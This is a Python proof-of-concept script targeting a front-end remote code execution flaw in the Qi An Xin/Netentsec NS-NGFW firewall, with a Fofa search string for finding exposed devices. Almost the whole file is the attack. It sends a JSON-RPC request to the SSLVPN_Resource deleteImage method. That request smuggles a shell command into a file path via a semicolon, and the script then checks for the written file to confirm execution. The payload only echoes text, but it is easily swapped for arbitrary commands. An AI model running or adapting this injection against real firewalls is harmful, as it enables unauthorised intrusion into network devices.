#  奇安信 NS-NGFW 网康防火墙前台RCE漏洞
#  Fofa: app="网康科技-下一代防火墙"


import requests
import urllib3
import time
import sys, getopt
urllib3.disable_warnings()


def title():
    print("[----------------------------------------------------------------]")
    print("[-----------    奇安信 NS-NGFW 网康防火墙前台RCE漏洞    -------------]")
    print("[-----------        user: python3 wangkangRCE        -------------]")
    print("[-----------            Author: Henry4E36            -------------]")
    print("[----------------------------------------------------------------]")


def commit():
    try:
        opt, agrs = getopt.getopt(sys.argv[1:],"hu:",["help","url="])
        url = ""
        for op, vaule in opt:

            if op ==  "-h" or op == "--help":
                print(""""
            [-]: 奇安信 NS-NGFW 网康防火墙前台RCE漏洞 
            [-]: -h or --help :  使用帮助
            [-]: -u or --url= :  检测目标的url地址          
            """)
                sys.exit(0)
            elif op == "-u" or op == "--url=":
                url = vaule
                return url
            else:
                rint("[-]: 参数有误！ eg:>> python3 wangkangRCE.py -u http://127.0.0.1")
                sys.exit(0)
    except Exception as e:
        print("[-]: 参数有误！ eg:>> python3 wangkangRCE.py -u http://127.0.0.1")
        sys.exit(0)

def target(url):
    target_url = url + "/directdata/direct/router"
    login_url = url + "/test.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
    }

    data = """
    {
    "action": "SSLVPN_Resource",
    "method": "deleteImage",
    "data":[{
      "data":["/var/www/html/b.txt;echo 'test'>/var/www/html/test.txt"]
    }],
    "type": "rpc",
    "tid": 17
}
    """
    try:
        post_res = requests.post(url=target_url,headers=headers,data=data,verify=False)
        if '"success":true' in post_res.text and post_res.status_code == 200:
            print("[--------------------------------------------------------]")
            print(f"\033[32m[!]  目标系统: {url} 可能存在RCE漏洞！\033[0m")
        else:
            print("[--------------------------------------------------------]")
            print(f"[0]  目标系统: {url} 不存在RCE漏洞！")
        print("[-]  正在进行进一步验证..........")
        time.sleep(1)
        login_res = requests.get(url=login_url,headers=headers,verify=False)
        if "test" in login_res.text and login_res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在RCE漏洞！\033[0m")
        else:
            print(f"[0]  目标系统: {url} 不存在RCE漏洞！")
    except Exception as e:
        print("[--------------------------------------------------------]")
        print(f"[0]  目标系统: {url} 出现意外情况！\n",e)

if __name__ == "__main__":
    title()
    url = commit()
    target(url)
